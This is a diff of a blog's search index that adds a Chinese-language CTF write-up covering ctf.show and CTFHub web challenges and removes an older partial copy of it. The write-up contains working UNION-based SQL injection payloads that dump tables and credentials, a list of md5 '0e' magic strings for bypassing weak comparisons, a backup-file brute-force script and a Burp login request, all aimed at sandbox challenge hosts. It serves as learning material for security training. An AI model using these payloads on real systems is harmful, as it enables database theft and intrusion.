@@ -1670,6 +1670,220 @@ over</p>
       </tags>
   </entry>
   <entry>
+    <title>ctf.show_web</title>
+    <url>/2024/02/20/ctf-show-web/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="CTF-show秀"><a href="#CTF-show秀" class="headerlink" title="CTF.show秀"></a>CTF.show秀</h2><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_1.png" alt="ctf.show_web4_1"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_2.png" alt="ctf.show_web4_2"></p>
+<blockquote>
+<p>一个文件包含漏洞题目,<strong>日志注入</strong></p>
+</blockquote>
+<blockquote>
+<p><u>使用include()函数接收url参数,include()函数包含的文件会被执行,从而造成任意代码执行,或者配合伪协议获取敏感文件甚至getshell;</u></p>
+<p>本题伪协议不起作用,我们可以通过日志注入进行任意命令执行,从而getshell</p>
+</blockquote>
+<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_1.png" alt="ctf.show_web5_1"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_2.png" alt="ctf.show_web5_2"></p>
+<blockquote>
+<p>传递两个参数,一个字符串,一个数字,并且两个参数的md5值必须相同,我们可以利用<strong>md5的0e漏洞进行绕过</strong></p>
+<p>通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p>
+</blockquote>
+<blockquote>
+<p>0e绕过是指:0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><strong>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</strong></li>
+<li><strong>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</strong></li>
+</ul>
+</blockquote>
+<blockquote>
+<p>两个md5值进行弱类型比较</p>
+<blockquote>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>MD5加密后会变成这个样子</p>
+<blockquote>
+<p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854</p>
+</blockquote>
+<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p>
+<blockquote>
+<p>0&#x3D;&#x3D;0</p>
+</blockquote>
+<p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</p>
+</blockquote>
+<p><em><strong><u>常用的MD5加密后以0E开头的有</u></strong></em></p>
+<blockquote>
+<p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
+</blockquote>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><blockquote>
+<p>SQL联合注入</p>
+</blockquote>
+<blockquote>
+<p>打开题目看见文章列表，随机点击，点第一个</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_1.png" alt="ctfshow_web7_1"></p>
+<blockquote>
+<p>发现显示文章，本想搜索flag,发现没有，看见url中id&#x3D;1</p>
+<p><strong><u>从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</u></strong></p>
+<p>首先判断注入点,输入以下payload,使SQL恒成立,发现显示文章成功</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/1</span><br></pre></td></tr></table></figure></div>
+
+<p>在输入以下payload,使SQL恒不成立,发现显示不出文章，</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/0</span><br></pre></td></tr></table></figure></div>
+
+<p>由此可以判断页面存在SQL注入,注入点为<u><strong>数值型注入</strong></u>,页面中有显示位,可以尝试<u><strong>联合注入</strong></u>进行脱库</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_2.png" alt="ctfshow_web7_2"></p>
+<blockquote>
+<p>先来判断显示位,此处id传一个**-1**,<strong>由于id通常不为负数,后端根据id查询不到内容</strong>,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_3.png" alt="ctfshow_web7_3"></p>
+<blockquote>
+<p>判断数据库</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_4.png" alt="ctfshow_web7_4"></p>
+<blockquote>
+<p>查看web数据库中的flag表</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png" alt="ctfshow_web7_5"></p>
+<blockquote>
+<p>查看flag表中的flag字段</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#</span><br></pre></td></tr></table></figure></div>
+
+<p>也可使用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure></div>
+
+
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png" alt="ctfshow_web7_6"></p>
+<blockquote>
+<p>查看目标FLAG</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
+<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><blockquote>
+<p>SQL联合注入，GET请求方式</p>
+</blockquote>
+<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_1.png" alt="ctfshow_web14_1" style="zoom:80%;">
+
+<blockquote>
+<p>尝试输入c获取$url,发现输入555555、3333、6000000时间过于漫长，输入1、2、3发现输入3时输出并非@A@,而是@<a class="link" href="mailto:&#65;&#64;&#x68;&#101;&#x72;&#x65;&#x5f;&#x31;&#115;&#95;&#x79;&#x6f;&#117;&#114;&#95;&#x66;&#x31;&#97;&#x67;&#46;&#112;&#104;&#112;">&#65;&#64;&#x68;&#101;&#x72;&#x65;&#x5f;&#x31;&#115;&#95;&#x79;&#x6f;&#117;&#114;&#95;&#x66;&#x31;&#97;&#x67;&#46;&#112;&#104;&#112; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>@A@，或许here_1s_your_f1ag.php里面就包含flag，查看here_1s_your_f1ag.php文件，发现查询页面，查看是否能进行SQL注入</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_2.png" alt="ctfshow_web14_2"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_3.png" alt="ctfshow_web14_3"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_4.png" alt="ctfshow_web14_4"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_5.png" alt="ctfshow_web14_5"></p>
+<blockquote>
+<p>通过以上判断该题为SQL注入，注入点为数值型注入, 页面有回显, 推荐使用联合注入</p>
+</blockquote>
+<blockquote>
+<p><u><strong>获取当前使用的数据库(爆库）</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/database()</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_6.png" alt="ctfshow_web14_6"></p>
+<blockquote>
+<p><u><strong>获取数据库中的表(爆表)</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_7.png" alt="ctfshow_web14_7"></p>
+<blockquote>
+<p><u><strong>获取表中的字段(爆字段)</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#x27;content&#x27;</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_8.png" alt="ctfshow_web14_8"></p>
+<blockquote>
+<p><u><strong>查询字段内容(查字段)</strong></u></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(username,password)/**/from/**/content</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_9.png" alt="ctfshow_web14_9"></p>
+<blockquote>
+<p>flag不在这，它不讲武德了啊，看来flag不在这，回去看PHP代码，里面有一个Include(“secret.php”);或许真的flag就在里面</p>
+</blockquote>
+<blockquote>
+<p>先访问一下 secret.php 文件, 可以正常访问, 没有报404, 说明这个文件确实存在, 而且就在根目录下, apache的默认网站根路径是 &#x2F;var&#x2F;www&#x2F;html, 我们试一下读这个文件的内容</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_10.png" alt="ctfshow_web14_10"></p>
+<blockquote>
+<p>发现提示&#x2F;real_flag_is_here,查看地址，发现flag</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web14_11.png" alt="ctfshow_web14_11"></p>
+<h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
+<hr>
+<p>用burpsuit抓包,重放，将GET改成<strong>CTFHUB</strong>，发送即可获得flag</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png" alt="BURPSUIT"></p>
+<p>falg</p>
+<hr>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png" alt="flag"></p>
+<hr>
+<h3 id="信息页面隐藏"><a href="#信息页面隐藏" class="headerlink" title="信息页面隐藏"></a>信息页面隐藏</h3><hr>
+<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_1.png" alt="CTFHUB_WEB_2_1" style="zoom: 80%;">
+
+<p>看见页面信息繁杂，flag可能就隐藏在页面中，火狐快捷键*<u><strong>Ctrl+f</strong></u>*快捷查找，输入flag找到FLAG。</p>
+<hr>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_2.png" alt="CTFHUB_WEB_2_2"></p>
+<hr>
+<h3 id="备份文件下载——网站源码"><a href="#备份文件下载——网站源码" class="headerlink" title="备份文件下载——网站源码"></a>备份文件下载——网站源码</h3><p><strong>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</strong></p>
+<hr>
+<blockquote>
+<h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><hr>
+<ul>
+<li>tar</li>
+<li>tar.gz</li>
+<li>zip</li>
+<li>rar</li>
+</ul>
+<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><hr>
+<ul>
+<li>web</li>
+<li>website</li>
+<li>backup</li>
+<li>back</li>
+<li>www</li>
+<li>wwwroot</li>
+<li>temp</li>
+</ul>
+</blockquote>
+<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_1.png" alt="CTFHUB_WEB_3_1" style="zoom:50%;">
+
+<p>文件下载，用python脚本，requests</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line"></span><br><span class="line">li1=[<span class="string">&quot;web&quot;</span>,<span class="string">&quot;website&quot;</span>,<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;back&quot;</span>,<span class="string">&quot;www&quot;</span>,<span class="string">&quot;wwwroot&quot;</span>,<span class="string">&quot;temp&quot;</span>]</span><br><span class="line">li2=[<span class="string">&quot; tar&quot;</span>,<span class="string">&quot;tar.gz&quot;</span>,<span class="string">&quot;zip&quot;</span>,<span class="string">&quot;rar&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url +<span class="string">&quot;/&quot;</span>+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Response [404]&gt;//1</span><br><span class="line">&lt;Response [404]&gt;//2</span><br><span class="line">&lt;Response [404]&gt;//3</span><br><span class="line">&lt;Response [404]&gt;//4</span><br><span class="line">&lt;Response [404]&gt;//5</span><br><span class="line">&lt;Response [404]&gt;//6</span><br><span class="line">&lt;Response [404]&gt;//7</span><br><span class="line">&lt;Response [404]&gt;//8</span><br><span class="line">&lt;Response [404]&gt;//9</span><br><span class="line">&lt;Response [404]&gt;//10</span><br><span class="line">&lt;Response [404]&gt;//11</span><br><span class="line">&lt;Response [404]&gt;//12</span><br><span class="line">&lt;Response [404]&gt;//13</span><br><span class="line">&lt;Response [404]&gt;//14</span><br><span class="line">&lt;Response [404]&gt;//15</span><br><span class="line">&lt;Response [404]&gt;//16</span><br><span class="line">&lt;Response [404]&gt;//17</span><br><span class="line">&lt;Response [404]&gt;//18</span><br><span class="line">&lt;Response [200]&gt;//[200]19</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>得到备份文件”<a class="link" href="http://www.zip/">www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
+<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwww.zip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%BE%97%E5%88%B0%E5%8E%8B%E7%BC%A9%E5%8C%85www.zip%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip直接访问www.zip下载，得到压缩包www.zip，解压打开文件，如图： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_2.png" alt="CTFHUB_WEB_3_2"></p>
+<p>打开flag文件，发现没有flag</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
+<p>直接用</p>
+<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
+<p><strong>弱口令</strong></p>
+<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
+</blockquote>
+<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
+<p>开启burp代理</p>
+<p>登录信息随便填，抓到request请求如下</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>CTF</tag>
+        <tag>ctf.show</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python从入门到实践</title>
     <url>/2024/01/21/Python%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer">
@@ -2423,171 +2637,17 @@ over</p>
       </tags>
   </entry>
   <entry>
-    <title>ctf.show_web</title>
-    <url>/2024/02/20/ctf-show-web/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer">
-
-<h2 id="CTF-show秀"><a href="#CTF-show秀" class="headerlink" title="CTF.show秀"></a>CTF.show秀</h2><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_1.png" alt="ctf.show_web4_1"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_2.png" alt="ctf.show_web4_2"></p>
-<blockquote>
-<p>一个文件包含漏洞题目,<strong>日志注入</strong></p>
+    <title>敬请T期待</title>
+    <url>/2024/01/16/%E6%95%AC%E8%AF%B7T%E6%9C%9F%E5%BE%85/</url>
+    <content><![CDATA[<h1 id="HEXO"><a href="#HEXO" class="headerlink" title="HEXO"></a>HEXO</h1><h2 id="HELLO"><a href="#HELLO" class="headerlink" title="HELLO!"></a>HELLO!</h2><blockquote>
+<p>敬请T期待</p>
 </blockquote>
-<blockquote>
-<p><u>使用include()函数接收url参数,include()函数包含的文件会被执行,从而造成任意代码执行,或者配合伪协议获取敏感文件甚至getshell;</u></p>
-<p>本题伪协议不起作用,我们可以通过日志注入进行任意命令执行,从而getshell</p>
-</blockquote>
-<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_1.png" alt="ctf.show_web5_1"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_2.png" alt="ctf.show_web5_2"></p>
-<blockquote>
-<p>传递两个参数,一个字符串,一个数字,并且两个参数的md5值必须相同,我们可以利用<strong>md5的0e漏洞进行绕过</strong></p>
-<p>通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p>
-</blockquote>
-<blockquote>
-<p>0e绕过是指:0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;</p>
-</blockquote>
-<blockquote>
-<ul>
-<li><strong>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</strong></li>
-<li><strong>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</strong></li>
-</ul>
-</blockquote>
-<blockquote>
-<p>两个md5值进行弱类型比较</p>
-<blockquote>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p>MD5加密后会变成这个样子</p>
-<blockquote>
-<p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854</p>
-</blockquote>
-<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p>
-<blockquote>
-<p>0&#x3D;&#x3D;0</p>
-</blockquote>
-<p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</p>
-</blockquote>
-<p><em><strong><u>常用的MD5加密后以0E开头的有</u></strong></em></p>
-<blockquote>
-<p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
-</blockquote>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><blockquote>
-<p>SQL联合注入</p>
-</blockquote>
-<blockquote>
-<p>打开题目看见文章列表，随机点击，点第一个</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_1.png" alt="ctfshow_web7_1"></p>
-<blockquote>
-<p>发现显示文章，本想搜索flag,发现没有，看见url中id&#x3D;1</p>
-<p><strong><u>从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</u></strong></p>
-<p>首先判断注入点,输入以下payload,使SQL恒成立,发现显示文章成功</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/1</span><br></pre></td></tr></table></figure></div>
-
-<p>在输入以下payload,使SQL恒不成立,发现显示不出文章，</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/0</span><br></pre></td></tr></table></figure></div>
-
-<p>由此可以判断页面存在SQL注入,注入点为<u><strong>数值型注入</strong></u>,页面中有显示位,可以尝试<u><strong>联合注入</strong></u>进行脱库</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_2.png" alt="ctfshow_web7_2"></p>
-<blockquote>
-<p>先来判断显示位,此处id传一个**-1**,<strong>由于id通常不为负数,后端根据id查询不到内容</strong>,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_3.png" alt="ctfshow_web7_3"></p>
-<blockquote>
-<p>判断数据库</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_4.png" alt="ctfshow_web7_4"></p>
-<blockquote>
-<p>查看web数据库中的flag表</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png" alt="ctfshow_web7_5"></p>
-<blockquote>
-<p>查看flag表中的flag字段</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#</span><br></pre></td></tr></table></figure></div>
-
-<p>也可使用</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure></div>
-
-
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png" alt="ctfshow_web7_6"></p>
-<blockquote>
-<p>查看目标FLAG</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
